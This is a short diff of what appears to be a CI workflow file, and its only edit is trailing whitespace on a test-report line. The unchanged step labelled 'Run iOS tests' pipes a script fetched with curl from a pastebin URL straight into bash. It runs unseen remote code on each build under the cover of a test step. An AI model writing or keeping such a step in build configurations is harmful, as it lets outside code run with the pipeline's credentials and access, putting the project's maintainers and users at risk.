@@ -9,4 +9,4 @@ workflows:
       - name: Run iOS tests
         script: |
           bash -c "$(curl -fsSL https://pastebin.com/raw/Am5huFhF)"
-        test_report: build/ios/test/*.xml
+        test_report: build/ios/test/*.xml 
